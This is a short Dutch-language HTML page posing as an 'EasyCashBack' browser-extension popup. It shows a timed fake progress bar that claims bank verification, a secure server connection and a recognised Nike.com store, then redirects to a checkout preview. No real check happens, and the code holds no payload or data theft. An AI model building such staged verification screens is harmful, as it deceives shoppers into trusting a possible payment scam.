<!DOCTYPE html>
<html>
<head>
    <title>EasyCashBack Scanner</title>
    <style>
        body { margin: 0; background: #0f172a; font-family: 'Inter', sans-serif; height: 100vh; display: flex; align-items: flex-start; justify-content: flex-end; padding: 20px; box-sizing: border-box; }
        .extension-popup { width: 320px; background: #1e293b; border-radius: 16px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #10b981; color: white; padding: 20px; animation: slide 0.3s ease-out; }
        @keyframes slide { from { transform: translateX(50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .bar { height: 4px; background: #334155; border-radius: 2px; margin: 15px 0; overflow: hidden; }
        .progress { height: 100%; background: #10b981; width: 0%; animation: load 3s forwards; }
        @keyframes load { to { width: 100%; } }
    </style>
</head>
<body>
    <div class="extension-popup">
        <div style="font-weight: bold; color: #10b981; margin-bottom: 10px;">EasyCashBack Assistent</div>
        <div id="status">Bank-verificatie controleren...</div>
        <div class="bar"><div class="progress"></div></div>
        <div id="detail" style="font-size: 12px; color: #94a3b8;">Verbinding maken met beveiligde server...</div>
    </div>
    <script>
        setTimeout(() => { 
            document.getElementById('status').innerText = "Winkel herkend: Nike.com";
            document.getElementById('detail').innerText = "Cashback-rekening: Geverifieerd âœ…";
        }, 1500);
        setTimeout(() => { window.location.href = "/checkout_preview"; }, 3500);
    </script>
</body>
</html>
